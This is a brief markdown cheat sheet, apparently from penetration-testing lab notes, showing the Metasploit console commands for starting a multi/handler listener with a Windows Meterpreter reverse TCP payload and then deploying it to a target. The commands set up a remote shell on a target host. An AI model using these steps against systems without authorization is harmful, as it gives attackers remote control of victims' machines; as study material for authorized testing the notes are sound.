# Meterpreter

Module used to get remote access to target hosts.

1. start handler (listener) with payload tailored to target host

```
msfconsole
msf > use exploit/multi/handler
msf exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
msf exploit(multi/handler) > set LHOST 10.11.0.xxx

#set optins

msf exploit(multi/handler) > exploit
# wait for session
```

2. Deploy exploit containing meterpreter reverse sehll on target host

